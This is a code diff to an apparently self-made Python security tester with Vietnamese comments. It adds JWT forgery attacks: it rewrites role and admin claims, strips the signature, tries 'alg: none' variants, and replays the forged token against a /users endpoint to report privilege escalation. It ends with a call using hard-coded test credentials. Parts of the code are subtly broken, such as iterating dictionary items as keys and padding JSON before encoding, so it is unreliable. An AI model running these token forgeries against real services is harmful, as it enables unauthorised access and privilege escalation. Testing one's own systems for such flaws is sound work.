@@ -1,6 +1,8 @@
 import itertools
 import concurrent.futures
 import threading
+import base64
+import json
 
 from security_function import SecurityFunction
 
@@ -186,6 +188,151 @@ class MyTester(SecurityFunction):
                 break
             
         return lo_hong
+
+    def jwt_scan_field(self,token_json):
+        predetermine_keys = ["role", "admin", "is_admin", "privilege", "access_level"]
+
+        for key in token_json.items():
+            if key.lower() in predetermine_keys:
+                if isinstance(key,str):
+                    token_json[key] = "admin"
+                elif isinstance(key,bool):
+                    token_json[key] = True
+                elif isinstance(key,int):
+                    token_json[key] = 1
+        
+        return token_json
+
+    
+    #Tại sao cần pad ở phần này ? Vì cơ chế của mã base64 thì yêu cầu độ dài đoạn văn bản phải là bội của 4 (chia hết cho 4) 
+    #và base64 sử dụng dấu "=" để đánh dấu kí tự thừa và tự động xóa sau khi mã xong
+    def padding64(self,data):
+        needed = len(data) % 4
+
+        if needed != 0 :
+            data += "=" * (4 - needed)
+        
+        return data
+    
+    #Thay đổi jwt token với điều kiên CẦN LOGIN_ENDPOINT và VALID CREDENTIAL để lấy token
+    #Sẽ xóa phần .signature ở cuối để xem server có kiểm tra không ?
+    def jwt_manipulation_payload(self,user_and_pass,login_endpoint):
+        username = user_and_pass.get("username")
+        password = user_and_pass.get("password")
+        user_cred = {
+            "username":f"{username}",
+            "password":f"{password}"
+        }
+
+        take_token = self.post_data(login_endpoint,user_cred)
+
+        if take_token.status_code == 200:
+            data = take_token.json()
+            token = data.get("access_token")
+
+            if token:
+                part1 = token.split(".")[0]
+                part2 = token.split(".")[1]
+                #Theo chuẩn base64 thì sau khi decode thì sẽ chuyển về byte và đánh dấu bằng b'' và dùng decode utf-8 để bỏ cái b'' đi
+                #Và định dạng trả về của phần decode này là string
+                dec_p1 = base64.urlsafe_b64decode(self.padding64(part1)).decode('utf-8')
+                dec_p2 = base64.urlsafe_b64decode(self.padding64(part2)).decode('utf-8')
+
+                #Do đó ở đây sử dung json để ép về dạng dictionary
+                p2_dict = json.loads(dec_p2)
+
+                payload_p2 = self.jwt_scan_field(p2_dict)
+
+                str_payload_p2 = json.dumps(payload_p2)
+                enc_pay_p2 = base64.urlsafe_b64encode(self.padding64(str_payload_p2).encode('utf-8')).decode('utf-8')
+                payload_last = part1 + "." + enc_pay_p2 + "."
+
+                header_pay = {
+                    "Authorization" : f"Bearer {payload_last}"
+                }
+
+                shoot = self._xu_ly_yeu_cau("GET","/users",headers = header_pay)
+                if shoot.status_code in [400,401,402]:
+                    print("jwt manipulation thất bại, hệ thống chặn được chỉnh sửa token")
+                elif shoot.status_code == 200:
+                    print("Thành công leo thang đặc quyền !!")
+                    
+            else:
+                print("no token")
+        else:
+            print("Dn thất bại")
+
+
+    def jwt_none_algro(self,user_and_pass,login_endpoint):
+        username = user_and_pass.get("username")
+        password = user_and_pass.get("password")
+        user_cred = {
+            "username":f"{username}",
+            "password":f"{password}"
+        }
+
+        take_token = self.post_data(login_endpoint,user_cred)
+
+        if take_token.status_code == 200:
+            data = take_token.json()
+            token = data.get("access_token")
+
+            if token:
+                part1 = token.split(".")[0]
+                part2 = token.split(".")[1]
+                #Theo chuẩn base64 thì sau khi decode thì sẽ chuyển về byte và đánh dấu bằng b'' và dùng decode utf-8 để bỏ cái b'' đi
+                #Và định dạng trả về của phần decode này là string
+                dec_p1 = base64.urlsafe_b64decode(self.padding64(part1)).decode('utf-8')
+                dec_p2 = base64.urlsafe_b64decode(self.padding64(part2)).decode('utf-8')
+
+                #Do đó ở đây sử dung json để ép về dạng dictionary
+                p1_dict = json.loads(dec_p1)
+                p2_dict = json.loads(dec_p2)
+
+                payload_p2 = self.jwt_scan_field(p2_dict)
+
+                str_payload_p2 = json.dumps(payload_p2)
+                enc_pay_p2 = base64.urlsafe_b64encode(str_payload_p2.encode('utf-8')).decode('utf-8').rstrip("=")
+
+                none_alg = ["none","None","NONE"]
+
+                for alg in none_alg:
+                    
+                    payload_p1 = p1_dict
+                    payload_p1["alg"] = alg
+
+
+                    str_payload_p1 = json.dumps(payload_p1)
+
+                    enc_pay_p1 = base64.urlsafe_b64encode(self.padding64(str_payload_p1).encode('utf-8')).decode('utf-8').rstrip("=")
+ 
+                    payload_last = enc_pay_p1 + "." + enc_pay_p2 + "."
+
+                    header_pay = {
+                        "Authorization" : f"Bearer {payload_last}"
+                    }
+
+                    shoot = self._xu_ly_yeu_cau("GET","/users",headers = header_pay)
+                    if shoot.status_code in [400,401,402,403]:
+                        print("jwt manipulation thất bại, hệ thống chặn được chỉnh sửa token")
+                    elif shoot.status_code == 200:
+                        print("Thành công leo thang đặc quyền !!")
+                    
+            else:
+                print("no token")
+        else:
+            print("Dn thất bại")
+
+
+
+tool = MyTester(url)
+
+u1_cred = {
+    "username":"duynt",
+    "password":"duynt"
+}
+tool.jwt_manipulation_payload(u1_cred,"/token")
+
 
 
 
